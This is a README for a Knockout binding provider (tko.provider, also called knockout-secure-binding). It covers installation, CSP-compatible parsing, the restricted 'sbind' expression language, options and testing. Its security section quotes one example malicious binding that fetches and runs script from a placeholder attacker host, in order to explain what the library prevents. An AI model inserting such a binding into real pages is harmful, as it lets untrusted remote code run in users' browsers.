tko.provider
============

 [![CircleCI](https://circleci.com/gh/knockout/tko.provider.svg?style=svg)](https://circleci.com/gh/knockout/tko.provider)


tko.provider is a binding provider for [Knockout](http://knockoutjs.com), namely it parses HTML attributes and converts them to handlers of bidirectional updates.

tko.provider can be used with a [Content Security Policy](http://www.w3.org/TR/CSP/).

This provider differs from Knockout's 3.X and prior default binder, which uses `new Function` to parse bindings, as discussed in [knockout/knockout#903](https://github.com/knockout/knockout/issues/903).

For more information, see the [blog post about knockout-secure-binding](http://brianmhunt.github.io/articles/knockout-plus-content-security-policy/).


Getting started
---


### Installing

You can get KSB from `bower` with:

```
bower install knockout-secure-binding
```

Using `npm` with:

```
npm install knockout-secure-binding
```

Save this to their respective settings with `--save-dev` or `--save`.

### Using (script)

Then include it in your project with a `script` tag and a property `secureBindingsProvider` will be added to the `ko` object. I.e.

```
<script src='knockout-secure-binding.js'></script>
```

KSB is a near drop-in replacement for the standard Knockout binding provider when provided the following options:

```
var options = {
   attribute: "data-bind",        // default "data-sbind"
   globals: window,               // default {}
   bindings: ko.bindingHandlers,  // default ko.bindingHandlers
   noVirtualElements: false       // default true
};
ko.bindingProvider.instance = new ko.secureBindingsProvider(options);
```

Having called the above, when you run `ko.applyBindings` the knockout bindings will be parsed by KSB and the respective bindings' `valueAccessors` will be KSB instead of Knockout's own binding engine (which at its core uses the `new Function`, which is barred by CSP's `eval` policy).

When the `attribute` option is not provided the default binding for KSB is `data-sbind`. You can see more options below. By default KSB the `globals` object for KSB is an empty object. The options are described in more detail below.


### Using (AMD Loader)

If you are using an AMD loader, then KSB is exported, and you should be able to
load it like this:

```
require(["knockout", "knockout-secure-binding"], function (ko, ksb) {
  // Show all options, more restricted setup than the Knockout regular binding.
  var options = {
     attribute: "data-sbind",      // ignore legacy data-bind values
     globals: {},                  // no globals
     bindings: ko.bindingHandlers, // still use default binding handlers
     noVirtualElements: true       // no virtual elements
  };

  ko.bindingProvider.instance = new ksb(options);
  /* ... */
});
```


Have a look at the example in [knockout-classBindingProvider](https://github.com/rniemeyer/knockout-classBindingProvider)) for more info.



The `sbind` language
---

The language used in KSB in bindings is a superset of JSON but a subset of Javascript. I will call it the *sbind* language, for convenience.

Sbind language is closer to JSON than Javascript, so it's easier to describe its differences by comparing it to JSON. The sbind language differs from JSON in that:

1. it understands the `undefined` keyword;
2. it looks up variables on `$data` or `$context` or `globals` (in that order);
3. functions can be called (but do not accept arguments);
4. top-level functions are called with `this` set to an object with the following keys: `$data`, `$context`, `globals`, `$element`, corresponding to the state for the respective element bound. †
5. a subset of Javascript expressions are available (see below);
6. observables that are part of expressions are automatically unwrapped for convenience.

† Note that this is a deviation from the ordinary Knockout behaviour, where
`this` would be `window` (unless the function is otherwise bound).

KSB provider uses Knockout's built-in bindings, so `text`, `foreach`, and all the others should work as expected. It also works with virtual elements.

This means that the following ought to work as expected:

```
<span data-bind='text: 42'></span>
<span data-bind='text: obs'></span>
<span data-bind='text: obs()'></span>
<span data-bind='text: obs_a() || obs_b()'></span>

<!-- The following are unwrapped because they are part of an expression-->
<span data-bind='text: obs_a || obs_b'></span>

<span data-bind='text: 1 + 2 / (obs % 4)'></span>
<span data-bind='css: { class_name: obs_a <= 400 }'></span>
<a data-bind='click: fn, attr: { href: obs }'></a>
```

The sbind language understands both compound identifiers (e.g. `obs()[1].member()` and expressions (e.g. `a + b * c`)). A full list of operators supported is below. Check out the `spec/knockout_secure_binding_spec.js` for a more thorough list of expressions that work as expected.

There are some restrictions on the sbind language. These include:

- it will not dereference static objects so the following will not work: `{ a: 1 }[obs()]`.
- functions do not accept arguments.


Security implications
---

As mentioned, one cannot use the default Knockout binding provider when a
Content Security Policy prohibits unsafe evaluations (`eval`,
`new Function`, `setTimeout(string)`, `setInterval(string)`).

Prohibiting unsafe evaluations with a Content Security Policy substantially substantially reduces the risk
of a cross-site scripting attack. See for example [Preventing XSS with Content Security Policy](http://benvinegar.github.io/csp-talk-2013/).

By using KSB in place of the regular binding provider one can continue to use
Knockout in an environment with a Content Security Policy. This includes for example [Chrome web apps](http://developer.chrome.com/apps/contentSecurityPolicy.html).

Independent of a Content Security Policy, KSB can help prevent the execution of arbitrary code in a Knockout binding. A malicious script such as
`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However with CSP and KSB you can prevent this script from executing by/because:

1. Not including `$` as a global;
2. Functions in KSB do not accept arguments;
3. You can use a CSP white-list, which prevents accessing the (presumably unknown) host `a.bad.place`.


Options
---

The `ko.secureBindingsProvider` constructor accepts one argument,
an object that may contain the following options:


| Option | Default | Description |
| ---: | :---: | :--- |
| attribute | `data-sbind` | The binding value on attributes |
| globals | `{}` | Where variables are looked up if not on `$context` or `$data` |
| bindings | `ko.bindingHandlers` | The bindings KO will use with KSB |
| noVirtualElements | `false` | Set to `true` to disable virtual element binding |

For example, `ko.secureBindingsProvider({ globals: { "$": jQuery }})`.


Expressions
---

KSB supports some [Javascript operations](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence#Table), namely:

| Type | Operators  |
| ---: | :-------- |
| Negation | `!` `!!`        |
| Multiplication | `*` `/` `%`      |
| Addition | `+` `-` |
| Comparison | `<` `<=` `>` `>=` |
| Equality | `==` `!=` `===` `!==` |
| Logic | `&&` <code>&#124;&#124;</code> |
| Bitwise | `&` `^` <code>&#124;</code> |

Notes:

1. Observables in expressions are unwrapped as a convenience so `text: a > b` will unwrap both `a` and `b` if they are observables. It will not unwrap for membership i.e. `a.property` will return the `property` of the observable (`a.property`), not the property of the observable's unwrapped value (`ko.unwrap(a).property`). If the variable referred to is not part of an expression (e.g. `text: a`) then the variable will not be unwrapped before being passed to a binding. This is the expected behaviour.

2. While negation and double-negation are supported, trible negation (`!!!`) will not work as expected.

3. When you use equality operators in *sbind* (`==` and `!=`), the operation performed will be their [non-evil twins (`===` and `!==`)](http://stackoverflow.com/a/359509/19212). The following are exactly the same: `data-sbind: x == y` and `data-sbind: x === y`. As Douglas Crockford puts it, in [Javascript: The Good Parts](http://rads.stackoverflow.com/amzn/click/0596517742): “My advice is to never use the evil twins.”


Tests
---

You can run a standalone server with `npm test`. It will
print the URL for the server to the console. You can connect
to it with any browser and the tests will be executed.

Automated tests with `chromedriver` can be initiated with
`npm start`.

You will need to independently start `chromedriver` with
`chromedriver --url-base=/wd/hub --port=4445`.

- Compile with [`gulp`](http://gulpjs.com/).
- Run a test server with `./node_modules/karma/bin/karma start`.
- Run tests with `npm test`

Make sure you have [installed `gulp`](https://github.com/gulpjs/gulp/blob/master/docs/getting-started.md) with `npm install -g gulp`.

Requires
---

Knockout 2.0+

KSB may use ES5 functions, including (but perhaps not limited to):

- `Object.defineProperty`
- `Object.keys`
- `String.trim`


Performance
---

KSB seems to be comparable in performance to Knockout's regular bindings. Here
is a [jsPerf example](http://jsperf.com/knockout-secure-binding), which seems to indicate KSB is around 7–10% slower, with a margin of error of ±10%.

I would expect the KSB parser to be slower than the native Javascript parser, even though it does less. The expressions and identifiers looked up in KSB have
a proportionately higher number of function calls per expression and dereference.

So one would expect KSB to be slower than the native bindings. That said, the portion of Knockout that KSB sits in is not a big bottleneck for performance. Individual bindings and especially their respective DOM operations seem to be a much greater concern.


How it works
---

KSB runs a one-pass parser on the bindings’ text and generates an array of identifier dereferences and a lazily generated syntax tree of expressions.

The identifier dereferences for something like `<span data-bind='x: a.b["c"]()'></span>` will look like (or convert into) this:

```
[
  function (x) { return x['b'] },
  function (x) { return x['c'] },
  function (x) { return x() },
]
```

When (if) the `x` binding calls its `valueAccessor` argument the identifier will be returned as the root value (`a`, presumably an object) then each of the dereference functions.

The expression tree is straightforward and for something like `1 + 4 - 8` it looks like this:

```
1     4
 \   /
  (+)     8
    \    /
     (-)
```

All to say, there is no real magic (or dragons) here.


LICENSE
---

The MIT License (MIT)

Copyright (c) 2013–2014 Brian M Hunt

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.
